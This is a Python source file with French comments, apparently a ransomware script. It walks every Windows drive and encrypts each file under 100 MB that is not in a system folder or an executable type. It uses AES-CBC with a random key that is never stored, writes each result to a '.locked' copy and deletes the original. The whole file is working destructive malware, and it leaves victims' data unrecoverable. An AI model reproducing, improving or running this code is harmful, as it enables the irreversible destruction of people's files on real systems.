import os
import string
from pathlib import Path
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

key = os.urandom(32)  
iv = os.urandom(16)   

extensions_exclues = (".exe", ".dll", ".sys", ".bat", ".com")

folders_exclus = [
    "windows",
    "/program files",
    "/program files (x86)",
    "/system volume information",
    "/$recycle.bin",
    "/.git",
]

max_size = 100 * 1024 * 1024


def is_in_excluded_folder(file_path: Path):
    path_str = str(file_path).lower()
    for exclu in folders_exclus:
        if exclu in path_str:
            return True
    return False


def get_existing_root_path():
    root_paths = []
    for letter in string.ascii_uppercase:
        drive = f"{letter}:/"
        if Path(drive).exists():
            root_paths.append(drive)
    return root_paths


def encrypte_file(input_file):
    backend = default_backend()

    with open(input_file, 'rb') as f:
        data = f.read()

    # Appliquer le padding (AES = 128-bit blocks)
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    # Créer le cipher AES CBC
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()

    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    output_file = input_file + ".locked"

    with open(output_file, 'wb') as f:
        f.write(iv + encrypted_data)  # stocker IV en clair en tête

    os.remove(input_file)

    return True


def search_file(base_path):
    base_path = Path(base_path)
    for file in base_path.rglob("*"):
        if is_in_excluded_folder(file):
            continue

        if file.is_file() and not file.suffix.lower() in extensions_exclues:
            try:
                if file.stat().st_size < max_size:
                    encrypte_file(str(file))
            except Exception as e:
                print(f"[!] Erreur sur {file}: {e}")
    return True


def main():
    paths = get_existing_root_path()
    for path in paths:
        search_file(path)
    


if __name__ == "__main__":
    main()
